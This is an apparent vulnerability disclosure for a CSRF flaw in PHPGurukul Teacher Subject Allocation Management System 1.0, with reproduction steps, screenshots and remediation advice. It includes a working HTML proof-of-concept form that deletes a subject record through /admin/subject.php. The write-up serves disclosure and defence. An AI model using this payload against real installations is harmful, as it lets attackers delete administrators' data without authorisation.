## Teacher Subject Allocation Management System V1.0


**Bug Description:**

A Cross Site Request Forgery (CSRF) vulnerability in "/admin/subject.php" endpoint of PHPGurukul Teacher Subject Allocation Management System 1.0  allows attackers to "Delete a Subject" via a crafted html request.

**Steps to Reproduce:** 

```
# Exploit Title: Cross Site Request Forgery (CSRF) vulnerability in PHPGurukul Teacher Subject Allocation Management System
# Date: 10-12-2023
# Exploit Author: dhabaleshwardas
# Vendor Homepage: https://phpgurukul.com/
# Software Link: https://phpgurukul.com/teacher-subject-allocation-system-using-php-and-mysql/
# Version: 1.0
# Tested on: firefox/chrome/brave
# CVE : 
```


To reproduce the attack:

1- Head to the http://localhost/tsas/admin/subject.php endpoint after logging into the admin account.

<img width="956" alt="1" src="https://github.com/dhabaleshwar/Open-Source-Vulnerabilities/assets/132373212/832bf663-b706-40b2-83c4-6eb774e5d333">



2- Here you can see that there are many added subjects, but now we will delete the First subject "Introduction to Psychology" using the HTML code we have written.

<img width="391" alt="2" src="https://github.com/dhabaleshwar/Open-Source-Vulnerabilities/assets/132373212/00ab9265-5674-40d4-9337-a2c453544ff2">


```
<html>
  <!-- CSRF PoC Delete Subject- Dhabaleshwar Das -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://localhost/tsas/admin/subject.php">
      <input type="hidden" name="delid" value="13" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>


```


3- We'll then execute this HTML code and we successfully see that the record has been deleted successfully.

<img width="638" alt="3" src="https://github.com/dhabaleshwar/Open-Source-Vulnerabilities/assets/132373212/19aad737-5d65-4f4c-bbfd-05cbd7c0353c">



4- This shows that the endpoint "/admin/subject.php" is vulnerable to CSRF attack.

<img width="942" alt="4" src="https://github.com/dhabaleshwar/Open-Source-Vulnerabilities/assets/132373212/0aa1f44e-45f3-48dc-8265-f9736cd1c94f">



5- CSRF attacks can lead to unauthorized actions being performed on behalf of a user. An attacker could manipulate data within the application, leading to the creation, modification, or deletion of records.

**Remediation:** 

1- Implement anti-CSRF tokens (also known as CSRF tokens or synchronizer tokens) in web forms. These tokens are unique per session and are embedded in the HTML form. The server validates the token with each form submission, ensuring that the request is legitimate.

2- Set the SameSite attribute on cookies to control when they are sent with cross-origin requests. This helps mitigate the risk of CSRF by preventing the automatic inclusion of cookies in cross-site requests.
